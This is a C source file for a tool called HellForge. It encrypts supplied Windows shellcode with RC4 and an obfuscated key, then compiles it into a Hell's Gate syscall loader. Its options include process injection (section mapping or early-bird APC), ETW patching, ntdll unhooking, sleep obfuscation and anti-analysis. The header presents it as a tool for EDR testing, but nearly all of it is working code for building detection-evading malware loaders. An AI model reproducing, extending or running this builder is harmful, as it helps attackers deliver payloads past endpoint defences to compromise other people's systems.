/*
 * HellForge — Hell's Gate loader variant compiler for EDR testing
 *
 * The build tool itself runs on Linux, macOS, and Windows.
 * OUTPUT is ALWAYS a Windows x64 PE (.exe) — never a Linux/macOS binary.
 * INPUT payload must be Windows x64 shellcode (raw .bin or a Windows DLL for sRDI).
 *
 * Build (Linux):   gcc -O2 -o build build.c
 * Build (macOS):   gcc -O2 -o build build.c          (requires brew install mingw-w64)
 * Build (Windows): gcc -O2 -o build.exe build.c
 * Usage:  ./build --payload <shellcode.bin> [options]
 *
 * Options:
 *   --payload <file>   raw Windows x64 shellcode binary (required)
 *   --target  <proc>   remote target process (e.g. notepad.exe)
 *                      omit for local self-injection
 *   --no-aa            disable anti-analysis
 *   --debug            enable debug console output
 *   --out     <name>   output filename without .exe
 */
#define _GNU_SOURCE
#ifdef _WIN32
#  ifndef _CRT_RAND_S
#    define _CRT_RAND_S   /* must precede <stdlib.h> */
#  endif
#endif
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#ifdef _WIN32
#  include <windows.h>
#  include <direct.h>     /* _mkdir */
#  undef mkdir
#  define mkdir(p,m) _mkdir(p)
#  define ssize_t SSIZE_T

static void rand_bytes(uint8_t *buf, size_t n) {
    for (size_t i = 0; i < n; i++) {
        unsigned int r = 0; rand_s(&r);
        buf[i] = (uint8_t)r;
    }
}

/* mkdtemp emulation using GetTempPath */
static char *mkdtemp_win(char *tmpl) {
    char tmp[512];
    GetTempPathA(sizeof(tmp), tmp);
    for (char *p = tmp; *p; p++) if (*p == '\\') *p = '/';
    int n = (int)strlen(tmp);
    while (n > 0 && tmp[n-1] == '/') tmp[--n] = '\0';
    DWORD tick = GetTickCount();
    for (int i = 0; i < 1000; i++, tick++) {
        snprintf(tmpl, 512, "%s/lb_%08X", tmp, tick ^ (DWORD)(UINT_PTR)tmpl);
        if (_mkdir(tmpl) == 0) return tmpl;
    }
    return NULL;
}
#  define mkdtemp(t) mkdtemp_win(t)

static ssize_t get_exe_path(char *buf, size_t sz) {
    DWORD n = GetModuleFileNameA(NULL, buf, (DWORD)sz);
    if (n > 0) { for (char *p = buf; *p; p++) if (*p == '\\') *p = '/'; }
    return n > 0 ? (ssize_t)n : -1;
}

static void cleanup_dir(const char *fwd) {
    char bs[512]; snprintf(bs, sizeof(bs), "%s", fwd);
    for (char *p = bs; *p; p++) if (*p == '/') *p = '\\';
    char cmd[544]; snprintf(cmd, sizeof(cmd), "rmdir /s /q \"%s\" 2>nul", bs);
    system(cmd);
}
#  define CLEANUP(p) cleanup_dir(p)

#else /* Linux / macOS */
#  include <fcntl.h>
#  include <unistd.h>
#  include <sys/types.h>
#  include <sys/wait.h>
#  if defined(__APPLE__)
#    include <mach-o/dyld.h>
#  endif

static void rand_bytes(uint8_t *buf, size_t n) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0 || read(fd, buf, n) != (ssize_t)n) {
        srand((unsigned)time(NULL));
        for (size_t i = 0; i < n; i++) buf[i] = (uint8_t)rand();
    }
    if (fd >= 0) close(fd);
}

static ssize_t get_exe_path(char *buf, size_t sz) {
#  if defined(__APPLE__)
    uint32_t n = (uint32_t)sz;
    return _NSGetExecutablePath(buf, &n) == 0 ? (ssize_t)strlen(buf) : -1;
#  else
    return readlink("/proc/self/exe", buf, sz);
#  endif
}
#  define CLEANUP(p) sh("rm -rf %s", p)
#endif

#include <sys/stat.h>
#include <errno.h>

/* -------------------------------------------------------------------------
 * Constants
 * ---------------------------------------------------------------------- */
#define KEY_SZ       16
#define MAX_PAYLOAD  (8 * 1024 * 1024)
#define PLEN         512    /* generic path buffer */
#define CLEN         8192   /* command buffer      */

#define CC       "x86_64-w64-mingw32-gcc"
#define ASBIN    "x86_64-w64-mingw32-as"
#ifndef _WIN32
#  define INCWRAP  "/tmp/wininc"
#endif

#define CFLAGS \
    "-D_WIN64 -O2 " \
    "-Wno-unused-variable -Wno-unused-function -Wno-unknown-pragmas " \
    "-Wno-int-conversion -Wno-comment -Wno-unused-but-set-variable"


/* -------------------------------------------------------------------------
 * RC4 (in-place)
 * ---------------------------------------------------------------------- */
static void rc4(const uint8_t *key, size_t klen, uint8_t *data, size_t dlen) {
    uint8_t S[256]; int j = 0;
    for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int ii = 0; j = 0;
    for (size_t n = 0; n < dlen; n++) {
        ii = (ii + 1) & 0xFF; j = (j + S[ii]) & 0xFF;
        uint8_t t = S[ii]; S[ii] = S[j]; S[j] = t;
        data[n] ^= S[(S[ii] + S[j]) & 0xFF];
    }
}

/* -------------------------------------------------------------------------
 * Key obfuscation
 *   enc[i] = (key[i] + i) ^ b   (random b)
 *   Loader recovers: key[i] = (enc[i] ^ b) - i
 *   Loader brute-forces b: (enc[0] ^ b) == key[0] == hint
 *
 * Returns hint byte (= key[0]).
 * ---------------------------------------------------------------------- */
static uint8_t obfuscate_key(const uint8_t *key, uint8_t *enc) {
    uint8_t b; rand_bytes(&b, 1);
    for (int i = 0; i < KEY_SZ; i++)
        enc[i] = ((key[i] + (uint8_t)i) & 0xFF) ^ b;
    return key[0];
}

/* -------------------------------------------------------------------------
 * Shell helper — wraps system(), returns exit code
 * ---------------------------------------------------------------------- */
static int sh(const char *fmt, ...) {
    char cmd[CLEN]; va_list ap;
    va_start(ap, fmt); vsnprintf(cmd, sizeof(cmd), fmt, ap); va_end(ap);
    int r = system(cmd);
#ifdef _WIN32
    return (r == -1) ? 1 : r;
#else
    return (r == -1) ? 1 : (WIFEXITED(r) ? WEXITSTATUS(r) : 1);
#endif
}

/* -------------------------------------------------------------------------
 * Write a text file
 * ---------------------------------------------------------------------- */
static int write_file(const char *path, const char *content) {
    FILE *f = fopen(path, "w");
    if (!f) { perror(path); return -1; }
    fputs(content, f);
    fclose(f);
    return 0;
}

#ifndef _WIN32
/* -------------------------------------------------------------------------
 * Create /tmp/wininc case-wrapper headers (idempotent)
 * ---------------------------------------------------------------------- */
static void setup_wrappers(void) {
    struct stat st;
    if (stat(INCWRAP "/Windows.h", &st) == 0) return;

    mkdir(INCWRAP, 0755);

    write_file(INCWRAP "/Windows.h",
        "#define STRSAFE_NO_DEPRECATE\n"
        "#include <windows.h>\n"
        "#include <strsafe.h>\n");

    write_file(INCWRAP "/windows.h",
        "#ifndef _WININC_WINDOWS_H_WRAPPER_\n"
        "#define _WININC_WINDOWS_H_WRAPPER_\n"
        "#define STRSAFE_NO_DEPRECATE\n"
        "#include_next <windows.h>\n"
        "#include <shlwapi.h>\n"
        "#include <strsafe.h>\n"
        "#endif\n");

    /* uppercase stubs for other headers the source may include */
    static const char *aliases[][2] = {
        { INCWRAP "/Strsafe.h", "#include <strsafe.h>\n"  },
        { INCWRAP "/Shlwapi.h", "#include <shlwapi.h>\n"  },
        { INCWRAP "/WinSvc.h",  "#include <winsvc.h>\n"   },
        { INCWRAP "/Sddl.h",    "#include <sddl.h>\n"     },
        { INCWRAP "/Aclapi.h",  "#include <aclapi.h>\n"   },
        { INCWRAP "/Objbase.h", "#include <objbase.h>\n"  },
        { NULL, NULL }
    };
    for (int i = 0; aliases[i][0]; i++)
        write_file(aliases[i][0], aliases[i][1]);
}
#endif /* !_WIN32 */

/* -------------------------------------------------------------------------
 * Generate loader_config.h in build dir
 * ---------------------------------------------------------------------- */
typedef struct {
    const char *target;
    const char *spawn;
    int         aa;
    int         dbg;
    int         etw_patch;
    int         unhook;
    int         sleep_obf;
    int         sleep_ms;
    int         early_bird;
} BUILD_CONFIG;

static int write_config_h(const char *bdir, uint8_t hint, size_t psz,
                           const BUILD_CONFIG *cfg) {
    char p[PLEN]; snprintf(p, sizeof(p), "%s/loader_config.h", bdir);
    FILE *f = fopen(p, "w"); if (!f) { perror(p); return -1; }

    fprintf(f,
        "#pragma once\n\n"
        "#define KEY_SIZE     %d\n"
        "#define HINT_BYTE    0x%02X\n"
        "#define PAYLOAD_SIZE %zu\n",
        KEY_SZ, hint, psz);

    if (cfg->target)    fprintf(f, "#define TARGET_PROCESS L\"%s\"\n", cfg->target);
    if (cfg->aa)        fprintf(f, "#define ANTI_ANALYSIS\n");
    if (cfg->dbg)       fprintf(f, "#define DEBUG\n");
    if (cfg->etw_patch) fprintf(f, "#define ETW_PATCH\n");
    if (cfg->unhook)    fprintf(f, "#define UNHOOK_DISK\n");
    if (cfg->sleep_obf) fprintf(f, "#define SLEEP_OBF\n");
    if (cfg->sleep_ms)  fprintf(f, "#define SLEEP_MS %d\n", cfg->sleep_ms);
    if (cfg->early_bird) {
        fprintf(f, "#define INJECT_EARLY_BIRD\n");
        /* writable WCHAR[] — CreateProcessW requires non-const lpCommandLine.
         * Definition lives in loader_payload.c; extern decl here.
         * Use WCHAR (not wchar_t) — windows.h isn't included yet at this point. */
        fprintf(f, "extern unsigned short SPAWN_PROCESS[];\n");
    }

    fprintf(f,
        "\nextern unsigned char Rc4CipherText[PAYLOAD_SIZE];\n"
        "extern unsigned char EncRc4Key[KEY_SIZE];\n");

    fclose(f); return 0;
}

/* -------------------------------------------------------------------------
 * Generate loader_payload.c in build dir
 * ---------------------------------------------------------------------- */
static int write_payload_c(const char *bdir, const uint8_t *ct, size_t ct_len,
                            const uint8_t *enc_key, const BUILD_CONFIG *cfg) {
    char p[PLEN]; snprintf(p, sizeof(p), "%s/loader_payload.c", bdir);
    FILE *f = fopen(p, "w"); if (!f) { perror(p); return -1; }

    fprintf(f, "#include \"loader_config.h\"\n#include <windows.h>\n\n");

    /* SPAWN_PROCESS definition — writable WCHAR[], not a const literal.
     * Declared as unsigned short[] in loader_config.h (no windows.h there yet);
     * here windows.h is already included so wchar_t / WCHAR are available. */
    if (cfg->early_bird) {
        fprintf(f, "wchar_t SPAWN_PROCESS[] = L\"");
        const char *src = cfg->spawn ? cfg->spawn
                                     : "C:\\Windows\\System32\\RuntimeBroker.exe";
        for (; *src; src++) {
            if (*src == '\\') fputc('\\', f);
            fputc(*src, f);
        }
        fprintf(f, "\";\n\n");
    }

    fprintf(f, "unsigned char Rc4CipherText[PAYLOAD_SIZE] = {");
    for (size_t i = 0; i < ct_len; i++) {
        if (i % 16 == 0) fprintf(f, "\n    ");
        fprintf(f, "0x%02X%s", ct[i], (i + 1 < ct_len) ? "," : "");
    }
    fprintf(f, "\n};\n\n");

    fprintf(f, "unsigned char EncRc4Key[KEY_SIZE] = {");
    for (int i = 0; i < KEY_SZ; i++)
        fprintf(f, "0x%02X%s", enc_key[i], (i + 1 < KEY_SZ) ? "," : "");
    fprintf(f, "};\n");

    fclose(f); return 0;
}

/* -------------------------------------------------------------------------
 * Compilation pipeline
 * ---------------------------------------------------------------------- */
static int compile_loader(const char *src_dir, const char *bdir, const char *out,
                          const BUILD_CONFIG *cfg) {
    /* base sources always compiled */
    const char *base_srcs[] = {
        "WinApi.c", "ApiHashing.c", "HellsGate.c",
        "AntiAnalysis.c", "Inject.c", "main.c",
        NULL
    };
    /* optional sources */
    const char *opt_srcs[8];
    int nopt = 0;
    if (cfg->etw_patch)  opt_srcs[nopt++] = "Etw.c";
    if (cfg->unhook)     opt_srcs[nopt++] = "Unhook.c";
    if (cfg->early_bird) opt_srcs[nopt++] = "EarlyBird.c";
    if (cfg->sleep_obf)  opt_srcs[nopt++] = "SleepObf.c";
    opt_srcs[nopt] = NULL;

    char incs[PLEN];
#ifdef _WIN32
    snprintf(incs, sizeof(incs), "-I\"%s\" -I\"%s\"", bdir, src_dir);
#else
    snprintf(incs, sizeof(incs), "-I%s -I%s -I" INCWRAP, bdir, src_dir);
#endif

    char objs[CLEN] = "";

    /* 1. assemble HellAsm.s */
    char asm_obj[PLEN];
    snprintf(asm_obj, sizeof(asm_obj), "%s/HellAsm.o", bdir);
    if (sh("%s %s/HellAsm.s -o %s", ASBIN, src_dir, asm_obj)) {
        fprintf(stderr, "[!] HellAsm.s assemble failed\n"); return -1;
    }
    snprintf(objs, sizeof(objs), "%s", asm_obj);

    /* 2. compile generated payload TU */
    char pl_obj[PLEN];
    snprintf(pl_obj, sizeof(pl_obj), "%s/loader_payload.o", bdir);
    if (sh("%s " CFLAGS " %s -c %s/loader_payload.c -o %s", CC, incs, bdir, pl_obj)) {
        fprintf(stderr, "[!] loader_payload.c compile failed\n"); return -1;
    }
    snprintf(objs + strlen(objs), sizeof(objs) - strlen(objs), " %s", pl_obj);

    /* 3. compile base sources */
    for (int i = 0; base_srcs[i]; i++) {
        char src[PLEN], obj[PLEN], obj_name[64];
        snprintf(src, sizeof(src), "%s/%s", src_dir, base_srcs[i]);
        snprintf(obj_name, sizeof(obj_name), "%s", base_srcs[i]);
        char *dot = strrchr(obj_name, '.'); if (dot) strcpy(dot, ".o");
        snprintf(obj, sizeof(obj), "%s/%s", bdir, obj_name);
        if (sh("%s " CFLAGS " %s -c %s -o %s", CC, incs, src, obj)) {
            fprintf(stderr, "[!] %s compile failed\n", base_srcs[i]); return -1;
        }
        snprintf(objs + strlen(objs), sizeof(objs) - strlen(objs), " %s", obj);
    }

    /* 4. compile optional sources */
    for (int i = 0; i < nopt; i++) {
        char src[PLEN], obj[PLEN], obj_name[64];
        snprintf(src, sizeof(src), "%s/%s", src_dir, opt_srcs[i]);
        snprintf(obj_name, sizeof(obj_name), "%s", opt_srcs[i]);
        char *dot = strrchr(obj_name, '.'); if (dot) strcpy(dot, ".o");
        snprintf(obj, sizeof(obj), "%s/%s", bdir, obj_name);
        if (sh("%s " CFLAGS " %s -c %s -o %s", CC, incs, src, obj)) {
            fprintf(stderr, "[!] %s compile failed\n", opt_srcs[i]); return -1;
        }
        snprintf(objs + strlen(objs), sizeof(objs) - strlen(objs), " %s", obj);
    }

    /* 5. link */
    if (sh("%s -o %s %s -lkernel32 -luser32 -lntdll", CC, out, objs)) {
        fprintf(stderr, "[!] link failed\n"); return -1;
    }
    return 0;
}

/* -------------------------------------------------------------------------
 * Input validation — reject chars that could break shell cmds or C strings
 * ---------------------------------------------------------------------- */
static int safe_name(const char *s) {
    for (; *s; s++)
        if (*s == '"' || *s == '\'' || *s == '`' || *s == '$' ||
            *s == ';'  || *s == '&'  || *s == '|' || *s == '/' ||
            *s == '\\' || *s == '\n' || *s == '\r')
            return 0;
    return 1;
}

/* -------------------------------------------------------------------------
 * Entry point
 * ---------------------------------------------------------------------- */
static void usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s --payload <file> [options]\n"
        "\n"
        "  NOTE: output is always a Windows x64 PE (.exe).\n"
        "        Input payload must be Windows x64 shellcode.\n"
        "        Linux/macOS payloads are NOT supported.\n"
        "\n"
        "  --payload <file>      raw Windows x64 shellcode (.bin)\n"
        "  --dll <file>          Windows DLL input (sRDI conversion)\n"
        "  --target <proc>       remote process name (default: self)\n"
        "  --inject <method>     mapping|early-bird (default: mapping)\n"
        "  --spawn <path>        spawn process for early-bird\n"
        "  --no-aa               disable anti-analysis\n"
        "  --debug               enable debug output\n"
        "  --etw-patch           patch ETW (NtTraceEvent + EtwEventWrite)\n"
        "  --unhook              unhook ntdll from disk\n"
        "  --sleep-obf           enable Ekko sleep obfuscation\n"
        "  --sleep-ms <N>        sleep duration in ms (default: 10000)\n"
        "  --out <name>          output name without .exe\n",
        prog);
}

int main(int argc, char *argv[]) {
    const char *payload_path = NULL, *dll_path = NULL;
    const char *out_name = NULL;
    BUILD_CONFIG cfg = {
        .aa       = 1,
        .sleep_ms = 10000,
    };
    char spawn_buf[512] = {0};

    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "--payload")   && i+1 < argc) payload_path  = argv[++i];
        else if (!strcmp(argv[i], "--dll")        && i+1 < argc) dll_path      = argv[++i];
        else if (!strcmp(argv[i], "--target")     && i+1 < argc) cfg.target    = argv[++i];
        else if (!strcmp(argv[i], "--out")        && i+1 < argc) out_name      = argv[++i];
        else if (!strcmp(argv[i], "--spawn")      && i+1 < argc) {
            strncpy(spawn_buf, argv[++i], sizeof(spawn_buf) - 1);
            cfg.spawn = spawn_buf;
        }
        else if (!strcmp(argv[i], "--inject")     && i+1 < argc) {
            const char *m = argv[++i];
            if (!strcmp(m, "early-bird")) cfg.early_bird = 1;
            else if (strcmp(m, "mapping")) {
                fprintf(stderr, "[!] unknown inject method: %s\n", m); return 1;
            }
        }
        else if (!strcmp(argv[i], "--sleep-ms")  && i+1 < argc) cfg.sleep_ms  = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--no-aa"))                     cfg.aa        = 0;
        else if (!strcmp(argv[i], "--debug"))                     cfg.dbg       = 1;
        else if (!strcmp(argv[i], "--etw-patch"))                 cfg.etw_patch = 1;
        else if (!strcmp(argv[i], "--unhook"))                    cfg.unhook    = 1;
        else if (!strcmp(argv[i], "--sleep-obf"))                 cfg.sleep_obf = 1;
        else { fprintf(stderr, "unknown arg: %s\n", argv[i]); usage(argv[0]); return 1; }
    }

    if (!payload_path && !dll_path) { usage(argv[0]); return 1; }
    if (payload_path && dll_path)   { fprintf(stderr, "[!] --payload and --dll are mutually exclusive\n"); return 1; }

    if (cfg.target   && !safe_name(cfg.target))   { fprintf(stderr, "[!] invalid --target\n");  return 1; }
    if (out_name     && !safe_name(out_name))      { fprintf(stderr, "[!] invalid --out\n");     return 1; }

    /* resolve builder directory */
    char self_path[PLEN], self_dir[PLEN];
    ssize_t n = get_exe_path(self_path, sizeof(self_path) - 1);
    if (n < 0) { strncpy(self_path, argv[0], sizeof(self_path) - 1); n = strlen(argv[0]); }
    self_path[n] = '\0';
    strncpy(self_dir, self_path, sizeof(self_dir));
    char *sl = strrchr(self_dir, '/'); if (sl) *sl = '\0'; else strcpy(self_dir, ".");

    /* sRDI conversion if --dll */
    char srdi_tmp[PLEN] = {0};
    if (dll_path) {
        char srdi_builder[PLEN], refl_loader[PLEN];
        snprintf(srdi_builder, sizeof(srdi_builder), "%s/tools/sRDI_builder", self_dir);
        snprintf(refl_loader,  sizeof(refl_loader),  "%s/tools/reflective_loader.dll", self_dir);
        struct stat st;
        if (stat(srdi_builder, &st) != 0 || stat(refl_loader, &st) != 0) {
            fprintf(stderr,
                "[!] sRDI tools not found.\n"
                "    Expected: %s\n"
                "              %s\n"
                "    Build with: %s/tools/setup_srdi.sh\n",
                srdi_builder, refl_loader, self_dir);
            return 1;
        }
        char tmp_dir[512] = "/tmp/srdi_XXXXXX";
        if (!mkdtemp(tmp_dir)) { perror("mkdtemp"); return 1; }
        snprintf(srdi_tmp, sizeof(srdi_tmp), "%s/srdi.bin", tmp_dir);
        if (sh("%s --loader %s --payload %s --output %s",
               srdi_builder, refl_loader, dll_path, srdi_tmp)) {
            fprintf(stderr, "[!] sRDI conversion failed\n");
            CLEANUP(tmp_dir);
            return 1;
        }
        payload_path = srdi_tmp;
    }

    /* read shellcode */
    FILE *pf = fopen(payload_path, "rb");
    if (!pf) { perror(payload_path); return 1; }
    fseek(pf, 0, SEEK_END); long plen = ftell(pf); rewind(pf);
    if (plen <= 0 || plen > MAX_PAYLOAD) {
        fprintf(stderr, "[!] payload size out of range (%ld)\n", plen); fclose(pf); return 1;
    }
    uint8_t *shellcode = malloc((size_t)plen);
    if (!shellcode || fread(shellcode, 1, (size_t)plen, pf) != (size_t)plen) {
        fprintf(stderr, "[!] payload read failed\n"); fclose(pf); return 1;
    }
    fclose(pf);

    /* generate key, encrypt */
    uint8_t key[KEY_SZ], enc_key[KEY_SZ];
    rand_bytes(key, KEY_SZ);
    uint8_t hint = obfuscate_key(key, enc_key);

    uint8_t *ct = malloc((size_t)plen);
    memcpy(ct, shellcode, (size_t)plen);
    rc4(key, KEY_SZ, ct, (size_t)plen);
    free(shellcode);

    /* print summary */
    printf("[*] Output       : Windows x64 PE (.exe) — Linux/macOS payloads not supported\n");
    printf("[+] Payload      : %ld bytes  (%s)\n", plen, payload_path);
    printf("[+] RC4 key      : ");
    for (int i = 0; i < KEY_SZ; i++) printf("%02X", key[i]);
    printf("\n[+] Hint byte    : 0x%02X\n", hint);
    printf("[+] Target       : %s\n", cfg.target ? cfg.target : "self (local)");
    printf("[+] Inject       : %s\n", cfg.early_bird ? "early-bird" : "mapping");
    printf("[+] Anti-analysis: %s\n", cfg.aa ? "on" : "off");
    printf("[+] Debug        : %s\n", cfg.dbg ? "on"  : "off");
    printf("[+] ETW patch    : %s\n", cfg.etw_patch ? "on" : "off");
    printf("[+] Unhook       : %s\n", cfg.unhook ? "on" : "off");
    printf("[+] Sleep obf    : %s\n", cfg.sleep_obf ? "on" : "off");

    char src_dir[PLEN], out_dir[PLEN], out_path[PLEN];
    snprintf(src_dir,  sizeof(src_dir),  "%s/src",    self_dir);
    snprintf(out_dir,  sizeof(out_dir),  "%s/output", self_dir);
    mkdir(out_dir, 0755);

    if (out_name)
        snprintf(out_path, sizeof(out_path), "%s/%s.exe",          out_dir, out_name);
    else
        snprintf(out_path, sizeof(out_path), "%s/loader_%ld.exe",  out_dir, (long)time(NULL));

    char bdir[512] = "/tmp/loader_build_XXXXXX";
    if (!mkdtemp(bdir)) { perror("mkdtemp"); free(ct); return 1; }

#ifndef _WIN32
    setup_wrappers();
#endif
    printf("[+] Compiling...\n");

    int ret = 0;
    if (write_config_h(bdir, hint, (size_t)plen, &cfg) != 0 ||
        write_payload_c(bdir, ct, (size_t)plen, enc_key, &cfg) != 0 ||
        compile_loader(src_dir, bdir, out_path, &cfg) != 0) {
        fprintf(stderr, "[!] Build failed\n");
        ret = 1;
    } else {
        struct stat st; stat(out_path, &st);
        printf("[+] Done         : %s  (%ldK)\n", out_path, (long)st.st_size / 1024);
    }

    CLEANUP(bdir);
    if (srdi_tmp[0]) CLEANUP(srdi_tmp);
    free(ct);
    return ret;
}
